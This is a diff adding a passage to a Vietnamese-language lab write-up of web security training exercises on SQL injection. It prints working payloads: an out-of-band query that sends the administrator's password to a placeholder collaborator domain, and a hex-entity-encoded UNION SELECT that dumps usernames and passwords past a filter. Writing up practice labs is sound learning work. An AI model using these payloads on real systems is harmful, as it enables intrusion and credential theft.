@@ -306,7 +306,32 @@ Xong, code tôi để tên là `blindSQLInjectionWithTimeDelaysAndInformationRet
 <h1>---------------------------------------------------------</h1>
 <br>
 
+![image](https://github.com/user-attachments/assets/f467c637-970d-467e-a71d-e232f023bdca)
 
+Bài này cần Burp Collaborator, mà cái này chỉ có ở trong burp pro, tôi không có nên...
 
+![image](https://github.com/user-attachments/assets/0f284c8d-ecd3-493b-bbcf-03b1a06995e3)
 
+Bài này cũng thế...<br>Để tạm payload ở đây `TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`
 
+![image](https://github.com/user-attachments/assets/8a7b9e09-f84d-42e7-9379-3de700cbc714)
+
+Đây là stock check feature và request của nó:
+
+![image](https://github.com/user-attachments/assets/f1435d07-de90-4a32-a1ad-195666c9a1fc)
+
+![image](https://github.com/user-attachments/assets/3c5dd0dc-eceb-4ba6-857a-9a976dbec866)
+
+Tôi để ý đến giá trị của storeId, nó sẽ thay đổi khi tôi chọn London hay Paris gì đấy, tôi thử `1 SELECT 'a'` thì bị từ chối
+
+![image](https://github.com/user-attachments/assets/fdf43389-36b1-45f3-98e4-6311d07fc0c1)
+
+Tôi gà quá nên có xem 1 chút xíu solution, xem được đoạn dùng extension thôi
+
+![image](https://github.com/user-attachments/assets/7b508531-8791-495b-9530-2fea3f357cca)
+
+Tôi dùng `2 UNION SELECT username||':'||password FROM users<@/hex_entities>` để chốt hạ
+
+![image](https://github.com/user-attachments/assets/d0971f66-8155-4f07-9d24-9f6f3d65058d)
+
+Vậy là gần xong hết, còn 2 bài do không burp pro
